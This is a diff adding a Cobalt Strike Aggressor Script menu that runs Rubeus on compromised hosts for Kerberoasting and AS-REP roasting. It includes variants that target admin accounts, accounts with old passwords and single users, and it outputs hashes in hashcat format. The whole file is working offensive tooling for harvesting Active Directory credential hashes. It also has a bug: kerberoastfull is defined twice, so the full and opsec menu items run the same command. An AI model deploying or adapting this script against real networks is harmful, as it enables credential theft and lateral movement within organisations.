@@ -1,0 +1,104 @@
+###############################
+##
+## Kerberoast and SPN's
+##
+##############################
+menu "Kerberoast and SPN's - T1208" {
+		item "Rubeus Kerberoast - Full"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberoastfull($bid);
+				}
+			}
+			
+		item "Rubeus Kerberoast ADSI Recon - Best Opsec"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberoastadsi($bid);
+				}
+			}
+			
+					
+		item "Rubeus Kerberoast Opsec"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberoastfull($bid);
+				}
+			}
+
+		item "Rubeus Kerberoast Admin"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberoastadmin($bid);
+				}
+			}
+
+		item "Rubeus Kerberoast accts w/old Passwords"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberoastoldpwd($bid);
+				}
+			}
+			
+item "Kerberoast Singular User - T1208"{
+
+    local('$bid');
+        foreach $bid ($1){
+            snipekerberoast($bid);
+     }
+    }
+
+		} 
+#End Kerberoast Menu
+
+###############################
+##
+## Kerberoast and SPN's
+##
+##############################
+
+sub kerberoastfull{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast");
+}
+######
+
+###Opsec Kerberoast function
+
+sub kerberoastfull{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast /opsec");
+}
+######
+
+###Admin Kerberoast function
+
+sub kerberoastadmin{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast /ldapfilter:'admincount=1'");
+}
+######
+
+###Old Password Kerberoast function
+
+sub kerberoastoldpwd{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast /pwdsetbefore:03-29-2019");
+}
+
+# Kerberoast Single User
+sub snipekerberoast{
+prompt_text("Enter Single SPN/User Name to Kerberoast", "", lambda({
+bexecute_assembly($bids, script_resource('exe/Rubeus.exe'), "kerberoast /user:$1 /output:hashcat");
+}, $bids => $1));
+}
+
+sub kerberoastadsi{
+fireAlias($1, "Recon-AD-SPNs");
+}
+		
+###############################
+##
+## Begin AS-REP Roasting
+##
+##############################
+
+sub asreproast{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "asreproast");
+}
